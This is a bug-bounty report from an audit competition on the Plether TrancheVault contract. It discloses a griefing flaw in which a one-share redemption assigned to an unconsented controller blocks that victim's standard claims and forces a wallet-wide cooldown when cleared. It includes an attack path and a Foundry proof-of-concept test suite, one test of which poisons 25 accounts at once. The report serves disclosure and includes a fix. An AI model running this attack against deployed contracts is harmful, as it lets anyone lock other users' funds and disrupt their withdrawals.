# \#98320 [SC-Low] Unconsented redemption-controller assignment poisons standard claims, and clearing the head restarts a cooldown

**Submitted on Nov 7th 2026 at 00:42:11 UTC by @go4ko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98320
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

`TrancheVault.requestRedeem` authenticates the share owner but lets that owner name any nonzero address as the request `controller`. The selected controller does not consent and need not have approved the owner as an operator.

An attacker can use its entire balance of one Junior share atom to create a legal redemption whose asset quote rounds to zero, while assigning an unrelated LP as controller. Settlement turns that request into a refund-only node at the head of the victim's private controller queue. A later, fully funded redemption belonging to the victim remains invisible to the standard `maxRedeem`/`maxWithdraw` views, and standard `redeem`/`withdraw` calls revert because all four functions inspect only the poisoned head.

The victim's USDG is not permanently frozen: Plether's explicit-ID `claimRedeem(requestId, ...)` bypasses the poisoned head and pays the funded request in full. The security impact is instead permissionless griefing. To restore its standard FIFO claim surface, the victim must acknowledge the attacker-created refund. Because the refund is nonzero, `claimRedeemRefund` returns the attacker's share to the victim and writes `lastDepositTime[victim] = block.timestamp`, placing the victim's entire remaining share balance into a fresh one-hour transfer and redemption cooldown.

The PoC uses an ordinary EOA victim with every Plether entry point available. It does not depend on a standard-only or otherwise incomplete controller contract.

## Vulnerability Details

### The owner can write into an unrelated controller's queue

`requestRedeem` checks the owner's balance, cooldown, request size, and caller authorization. It does not authenticate `controller`:

```solidity
function requestRedeem(
    uint256 shares,
    address controller,
    address owner
) external returns (uint256 requestId) {
    // ... owner eligibility checks ...
    if (msg.sender != owner && !isOperator[owner][msg.sender]) {
        _spendAllowance(owner, msg.sender, shares);
    }
    _transfer(owner, address(this), shares);

    requestId = _enqueueRedeemRequest(shares, controller);
    emit RedeemRequest(controller, owner, requestId, msg.sender, shares);
}
```

`_enqueueRedeemRequest` immediately appends the request to the chosen controller's linked list:

```solidity
RedeemPosition storage position = redeemRequests[controller][requestId];
if (!position.queued) {
    _appendControllerRedeem(controller, requestId);
}
```

The minimum-size check does not prevent the attack. `_requireMinimumRedeemSize` intentionally permits a below-minimum request when `shares == maxShares`, allowing users to exit their complete dust balance:

```solidity
if (estimateRedeemAssets(shares) < POOL.minTrancheDepositAssets() && shares < maxShares) {
    revert TrancheVault__WithdrawalTooSmall();
}
```

An attacker holding exactly one share atom therefore passes admission even though `estimateRedeemAssets(1) == 0`.

### A refund-only request poisons the standard FIFO surface

Settlement refunds a matured epoch only when the epoch's combined shares quote zero assets (`HousePool._fundRedemptionPhase`):

```solidity
uint256 fullHeadAssets = REDEMPTION_MATH_SIDECAR.netAssetsForShares(
    remainingShares, phase.pricingPrincipal, phase.pricingSupply, 1, 1000, feeBps
);
if (fullHeadAssets == 0) {
```

The attack therefore needs an epoch with no other redemption large enough to make that combined quote nonzero. Requests are public on-chain, so the attacker can check that the epoch is empty and submit shortly before the five-minute request cutoff. If another LP's redemption still joins the epoch, the epoch is funded instead: the victim's one-share position quotes zero assets, standard `redeem(1, ...)` clears it, and no cooldown starts. The second PoC test shows this case. The attacker can retry in a later epoch with another share atom.

After settlement rejects the zero-output request, it remains the victim's controller head until its refund is acknowledged. Standard withdrawals, redemptions, and their maximum views resolve only that head:

```solidity
function withdraw(uint256 assets, address receiver, address controller)
    public
    override
    returns (uint256 shares)
{
    return _claimWithdraw(controllerRedeemHead[controller], assets, receiver, controller);
}

function redeem(uint256 shares, address receiver, address controller)
    public
    override
    returns (uint256 assets)
{
    return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
}

function maxWithdraw(address controller) public view override returns (uint256) {
    uint256 requestId = controllerRedeemHead[controller];
    return requestId == 0 ? 0 : claimableRedeemAssets(requestId, controller);
}

function maxRedeem(address controller) public view override returns (uint256) {
    uint256 requestId = controllerRedeemHead[controller];
    return requestId == 0 ? 0 : claimableRedeemRequest(requestId, controller);
}
```

Consequently, a later request may have positive funded shares and USDG while both standard maximum views remain zero and both standard claim functions fail.

Plether also exposes an explicit-ID function:

```solidity
function claimRedeem(
    uint256 requestId,
    uint256 shares,
    address receiver,
    address controller
) public returns (uint256 assets) {
    return _claimRedeem(requestId, shares, receiver, controller);
}
```

The PoC proves this function pays the later request in full. This bounds the issue to griefing rather than permanent freezing.

### Cleaning the unsolicited head restarts the victim's whole-wallet cooldown

Only the controller or its approved operator can acknowledge the refund. For a nonzero share refund, `claimRedeemRefund` writes a fresh wallet-wide cooldown timestamp before returning the shares:

```solidity
function claimRedeemRefund(
    uint256 requestId,
    address receiver,
    address controller
) external returns (uint256 shares) {
    _requireControllerAuth(controller);
    // ... refund accounting ...
    if (shares != 0) {
        lastDepositTime[receiver] = block.timestamp;
        _transfer(address(this), receiver, shares);
    }
}
```

`maxRequestRedeem` then returns zero for the complete wallet until one hour elapses:

```solidity
if (seedReceiver == address(0) || block.timestamp < lastDepositTime[owner] + DEPOSIT_COOLDOWN) {
    return 0;
}
```

Transfers from the victim also revert during that interval. The attacker cannot perform the acknowledgement itself, but it has created a state the victim must now handle: use explicit-ID claims, accept the cooldown, or first move its shares to another wallet.

## Attack Path

1. The attacker obtains one matured Junior share atom as its entire balance. Its asset quote is zero.
2. The attacker calls `requestRedeem(1, victim, attacker)`. Owner authorization succeeds, and no controller authorization is required.
3. With no other redemption making the epoch's combined quote nonzero, permissionless LP settlement marks the zero-output request refundable. It remains `controllerRedeemHead[victim]`.
4. The victim later submits an ordinary partial redemption. It is fully funded behind the poisoned head.
5. `maxRedeem(victim)` and `maxWithdraw(victim)` still return zero, and standard `redeem` reverts.
6. `claimRedeem(victimRequestId, ...)` nevertheless pays the victim's funded USDG in full, demonstrating that principal is not frozen.
7. The attacker cannot remove the poison because refund acknowledgement requires victim authority.
8. When the victim acknowledges the one-share refund to restore its standard FIFO queue, Plether sets `lastDepositTime[victim]` to the current timestamp.
9. The victim's entire retained share balance becomes non-transferable and ineligible for a new redemption request for exactly one hour.

The attack can be repeated for future controller activity by spending another dust share in a later epoch. A newly appended poison cannot jump ahead of a victim request that is already queued, so this report does not claim an unavoidable or permanent freeze.

## Impact Details

The demonstrated harm is:

- permissionless injection of terminal state into another LP's private controller queue;
- denial of the standard `redeem`, `withdraw`, `maxRedeem`, and `maxWithdraw` surface until the unsolicited head is handled;
- forced use of a protocol-specific explicit-ID claim path for funded requests; and
- a fresh one-hour whole-wallet cooldown if the victim restores the standard FIFO surface by accepting the nonzero refund while the shares are still in that wallet.

The attacker receives no profit. Its cost is one share atom plus gas per poisoned controller, and each controller needs its own attacker account holding exactly one atom, because the minimum-size exemption applies only to a full-balance exit. A deposit at the 1 USDG minimum yields about 1,000,000,000 share atoms at par, so the share cost is negligible.

One epoch can poison many controllers, as long as the epoch's combined shares still quote zero assets. The third PoC test poisons 25 unrelated controllers in one settlement. Each of those LPs then has to use the explicit-ID claim path for later funded requests, accept a one-hour lock on its whole share balance to clear the head, or spend extra transactions moving its shares to another wallet first.

This matches the competition's Medium impact “Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)”. The PoC deliberately proves that explicit-ID claiming recovers all funded USDG, so it does not claim Critical permanent freezing.

## Why This Is Not a Known Issue

- **MED-24** concerns dust redemption epochs consuming the global bounded settlement budget and delaying later epochs. This report concerns unconsented insertion into a different user's private controller queue after global settlement has already completed. Preventing controller-queue injection would not change MED-24's bounded global processing behavior.
- **LOW-39** concerns dusting a chosen third-party share receiver so its claim reverts. This path does not dust a receiver before a claim; it creates a refund request controlled by the victim.
- **LOW-40** concerns a controller choosing an unrelated third-party receiver and directly imposing cooldown through share delivery. Its fix requires `receiver == controller`. This report follows that rule: the attacker instead names the victim as controller when creating the request, and the missing consent check occurs earlier in `requestRedeem`.
- **LOW-67** accepts that a full-balance dust exit can burn the redeemer's own dust for no assets. This report does not dispute that exit. Here the exit is the tool, and the harmed party is a different account that made no request.
- The documented rule that a refundable head must be reclaimed before standard claims advance explains the downstream FIFO behavior. It does not address an unrelated owner being able to manufacture that head for another controller without consent.
- `SECURITY.md` L1399 and `IAsyncTrancheVault.sol` L135-L137 record that a terminal refund restarts the receiver's cooldown. They describe shares returning from a request the user made. Here the victim never made the request. `IAsyncTrancheVault.sol` L12-L14 states that “share delivery cannot impose another account's cooldown”, and this path does so through an unrelated owner's request.
- `IAsyncTrancheVault.sol` L11 states that “request authorization follows ERC-7540 owner approval rules”. Those rules decide who may spend the shares. The harm comes from combining that rule with a zero-output dust exit, a refund-only head that blocks standard claims, and cleanup that restarts a cooldown.

## Recommendation

Require controller consent before an owner can create a redemption request for a different controller. For example, when `controller != owner`, require the caller to be the controller or an operator approved by the controller, or introduce an explicit controller opt-in mapping that preserves legitimate owner/controller separation.

As a defense in depth, standard claim traversal could ignore terminal refund-only nodes while leaving their shares separately reclaimable by the authorized controller. Any traversal must remain bounded.

Do **not** make nonzero `claimRedeemRefund` execution permissionless. Because that function returns shares and writes `lastDepositTime`, permissionless execution would let an attacker directly restart another account's cooldown and would undo the receiver-consent protection added for LOW-40.

## References

- [`TrancheVault.requestRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L631)
- [`TrancheVault._enqueueRedeemRequest`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L688-L708)
- [Standard head-based claims and explicit-ID `claimRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1020)
- [`claimRedeemRefund`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L916-L946)
- [`maxWithdraw`, `maxRedeem`, and `maxRequestRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1335)
- [`IAsyncTrancheVault` claim semantics](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IAsyncTrancheVault.sol#L7-L17)
- [`IAsyncTrancheVault.claimRedeemRefund` cooldown note](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IAsyncTrancheVault.sol#L135-L137)
- [`HousePool._fundRedemptionPhase` zero-output check](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L957-L960)
- [`SECURITY.md` refund cooldown limitation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1399)

## Proof of Concept

## Proof of Concept

Save the following file as `packages/perps/test/perps/regression/UnsolicitedControllerQueueGrief.t.sol` in the frozen repository:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../shared/HousePoolTestBase.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

/// @notice An owner can assign an unrelated controller to a redeem request without that
///         controller's consent. A zero-output request then becomes a refund-only FIFO head
///         for the victim. Funded assets are recoverable by explicit request id, but the
///         standard FIFO claim surface is blocked and clearing the unsolicited refund
///         restarts the victim's whole-wallet cooldown.
contract UnsolicitedControllerQueueGriefTest is HousePoolAsyncTestBase {

    address internal constant FUNDER = address(0xF00D);
    address internal constant ATTACKER = address(0xBAD);
    address internal constant VICTIM = address(0xBEEF);
    address internal constant RECEIVER = address(0xCAFE);
    address internal constant SETTLER = address(0xD00D);

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _settleViaPublicRouter(
        uint256 requestId
    ) internal {
        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp < maturity) {
            vm.warp(maturity);
        }

        uint256 markPrice = engine.lastMarkPrice();
        bytes[] memory updateData = _mockPythUpdateData(markPrice == 0 ? 1e8 : markPrice);
        vm.prank(SETTLER);
        router.settleLpEpoch(updateData);
    }

    function _depositViaPublicRouter(
        TrancheVault vault,
        address owner,
        uint256 assets
    ) internal returns (uint256 requestId, uint256 shares) {
        settlementToken.mint(owner, assets);
        vm.startPrank(owner);
        settlementToken.approve(address(vault), assets);
        requestId = vault.requestDeposit(assets, owner, owner);
        vm.stopPrank();

        _settleViaPublicRouter(requestId);
        uint256 claimableAssets = vault.claimableDepositRequest(requestId, owner);
        assertEq(claimableAssets, assets, "deposit must activate through the public Router path");
        vm.prank(owner);
        shares = vault.claimDeposit(requestId, claimableAssets, owner, owner);
        assertGt(shares, 0, "deposit must mint shares");
    }

    function test_UnsolicitedRefundPoisonsFifoAndCleanupForcesCooldown() public {
        (, uint256 mintedShares) = _depositViaPublicRouter(juniorVault, FUNDER, 10_000e6);
        _finishAsyncCooldown(juniorVault, FUNDER);

        uint256 victimShares = mintedShares / 2;
        vm.startPrank(FUNDER);
        juniorVault.transfer(ATTACKER, 1);
        juniorVault.transfer(VICTIM, victimShares);
        vm.stopPrank();

        assertEq(juniorVault.balanceOf(ATTACKER), 1, "attacker owns one legal dust exit");
        assertEq(juniorVault.estimateRedeemAssets(1), 0, "one share atom quotes zero assets");

        // The attacker is the share owner, but chooses the unrelated victim as controller.
        // No consent or operator approval from VICTIM is checked.
        vm.prank(ATTACKER);
        uint256 poisonRequestId = juniorVault.requestRedeem(1, VICTIM, ATTACKER);
        _settleViaPublicRouter(poisonRequestId);

        assertEq(juniorVault.refundableRedeemRequest(poisonRequestId, VICTIM), 1);
        assertTrue(juniorVault.redeemRefundPending(poisonRequestId, VICTIM));
        assertEq(juniorVault.controllerRedeemHead(VICTIM), poisonRequestId);
        assertEq(juniorVault.maxRedeem(VICTIM), 0);
        assertEq(juniorVault.maxWithdraw(VICTIM), 0);

        // The victim later requests only half of its balance, leaving a meaningful wallet
        // balance on which the cleanup-induced cooldown can be observed.
        uint256 victimRequestShares = victimShares / 2;
        vm.prank(VICTIM);
        uint256 victimRequestId = juniorVault.requestRedeem(victimRequestShares, VICTIM, VICTIM);
        assertGt(victimRequestId, poisonRequestId);
        _settleViaPublicRouter(victimRequestId);

        uint256 fundedShares = juniorVault.claimableRedeemRequest(victimRequestId, VICTIM);
        uint256 fundedAssets = juniorVault.claimableRedeemAssets(victimRequestId, VICTIM);
        assertGt(fundedShares, 0, "victim request is funded");
        assertGt(fundedAssets, 0, "funded USDG is held in withdrawal escrow");

        // Standard ERC-4626/ERC-7540 claims and max views inspect only the poisoned head.
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "poison hides funded shares from standard view");
        assertEq(juniorVault.maxWithdraw(VICTIM), 0, "poison hides funded assets from standard view");
        vm.prank(VICTIM);
        vm.expectRevert();
        juniorVault.redeem(fundedShares, VICTIM, VICTIM);
        vm.prank(VICTIM);
        vm.expectRevert();
        juniorVault.withdraw(fundedAssets, VICTIM, VICTIM);

        // Accurately bound the impact: explicit-id claiming bypasses the poisoned head and
        // pays the victim in full. The issue is griefing, not a permanent fund freeze.
        uint256 victimAssetsBefore = settlementToken.balanceOf(VICTIM);
        vm.prank(VICTIM);
        uint256 paid = juniorVault.claimRedeem(victimRequestId, fundedShares, VICTIM, VICTIM);
        assertEq(paid, fundedAssets);
        assertEq(settlementToken.balanceOf(VICTIM), victimAssetsBefore + fundedAssets);
        assertEq(juniorVault.claimableRedeemAssets(victimRequestId, VICTIM), 0);
        assertEq(
            juniorVault.controllerRedeemHead(VICTIM), poisonRequestId, "explicit claim leaves poison head installed"
        );

        // The attacker cannot perform cleanup. The burden remains on the victim/controller.
        vm.prank(ATTACKER);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        juniorVault.claimRedeemRefund(poisonRequestId, VICTIM, VICTIM);

        uint256 retainedVictimShares = juniorVault.balanceOf(VICTIM);
        assertGt(retainedVictimShares, 1, "victim retains a meaningful wallet balance");

        // Clearing the unsolicited nonzero refund returns the attacker's one share to the
        // victim and timestamps the entire victim wallet with a fresh one-hour cooldown.
        vm.prank(VICTIM);
        assertEq(juniorVault.claimRedeemRefund(poisonRequestId, VICTIM, VICTIM), 1);
        assertEq(juniorVault.balanceOf(VICTIM), retainedVictimShares + 1);
        assertEq(juniorVault.lastDepositTime(VICTIM), block.timestamp);
        assertEq(juniorVault.controllerRedeemHead(VICTIM), 0);
        assertEq(juniorVault.maxRequestRedeem(VICTIM), 0, "whole wallet is temporarily locked");

        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(RECEIVER, 1);

        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(1, VICTIM, VICTIM);

        // The grief is bounded to the configured cooldown and disappears at exactly one hour.
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN());
        uint256 unlockedShares = juniorVault.balanceOf(VICTIM);
        assertEq(juniorVault.maxRequestRedeem(VICTIM), unlockedShares);
        vm.prank(VICTIM);
        uint256 postCooldownRequestId = juniorVault.requestRedeem(unlockedShares, VICTIM, VICTIM);
        assertGt(postCooldownRequestId, poisonRequestId);
    }

    /// @notice Precondition: another LP's redemption in the same epoch makes the epoch fundable, so there is no
    ///         refund head and no cooldown. The attack needs an epoch whose combined shares quote zero assets.
    function test_SharedEpochIsFundedAndDoesNotPoison() public {
        (, uint256 mintedShares) = _depositViaPublicRouter(juniorVault, FUNDER, 10_000e6);
        _finishAsyncCooldown(juniorVault, FUNDER);

        vm.startPrank(FUNDER);
        juniorVault.transfer(ATTACKER, 1);
        juniorVault.transfer(VICTIM, mintedShares / 2);
        vm.stopPrank();

        vm.prank(ATTACKER);
        uint256 poisonRequestId = juniorVault.requestRedeem(1, VICTIM, ATTACKER);
        vm.prank(FUNDER);
        uint256 otherRequestId = juniorVault.requestRedeem(mintedShares / 4, FUNDER, FUNDER);
        assertEq(otherRequestId, poisonRequestId, "both requests share one epoch");
        _settleViaPublicRouter(poisonRequestId);

        assertFalse(juniorVault.redeemRefundPending(poisonRequestId, VICTIM), "a shared epoch is funded");
        assertEq(juniorVault.maxRedeem(VICTIM), 1, "the standard view sees the one-share position");
        assertEq(juniorVault.maxWithdraw(VICTIM), 0, "the one-share position holds no assets");

        uint256 cooldownBefore = juniorVault.lastDepositTime(VICTIM);
        vm.prank(VICTIM);
        assertEq(juniorVault.redeem(1, VICTIM, VICTIM), 0);
        assertEq(juniorVault.controllerRedeemHead(VICTIM), 0, "standard redeem clears the node");
        assertEq(juniorVault.lastDepositTime(VICTIM), cooldownBefore, "no cooldown starts");
    }

    /// @notice Scale: one epoch poisons many unrelated controllers, each from its own one-atom attacker account.
    function test_OneEpochPoisonsManyControllers() public {
        _depositViaPublicRouter(juniorVault, FUNDER, 10_000e6);
        _finishAsyncCooldown(juniorVault, FUNDER);

        uint256 controllers = 25;
        uint256 poisonRequestId;
        for (uint256 i; i < controllers; ++i) {
            address attackerAccount = address(uint160(0xA0000 + i));
            vm.prank(FUNDER);
            juniorVault.transfer(attackerAccount, 1);
            vm.prank(attackerAccount);
            poisonRequestId = juniorVault.requestRedeem(1, address(uint160(0xB0000 + i)), attackerAccount);
        }
        _settleViaPublicRouter(poisonRequestId);

        for (uint256 i; i < controllers; ++i) {
            address victim = address(uint160(0xB0000 + i));
            assertTrue(juniorVault.redeemRefundPending(poisonRequestId, victim), "every controller holds a refund");
            assertEq(juniorVault.controllerRedeemHead(victim), poisonRequestId, "every controller is poisoned");
            assertEq(juniorVault.refundableRedeemRequest(poisonRequestId, victim), 1);
        }
    }

}
```

Run:

```sh
forge test --root packages/perps \
  --match-path test/perps/regression/UnsolicitedControllerQueueGrief.t.sol -vv
```

Expected result:

```text
Ran 3 tests for test/perps/regression/UnsolicitedControllerQueueGrief.t.sol:UnsolicitedControllerQueueGriefTest
[PASS] test_OneEpochPoisonsManyControllers()
[PASS] test_SharedEpochIsFundedAndDoesNotPoison()
[PASS] test_UnsolicitedRefundPoisonsFifoAndCleanupForcesCooldown()
Suite result: ok. 3 passed; 0 failed; 0 skipped
```

The tests use public vault entry points and permissionless `OrderRouter.settleLpEpoch` calls with mocked Pyth updates, as the contest permits. They observe the real LP epochs and one-hour deposit cooldown, do not impersonate an in-scope contract, and do not forge in-scope storage. Mock USDG is minted only to the depositor before entering the pool through the public asynchronous deposit flow.

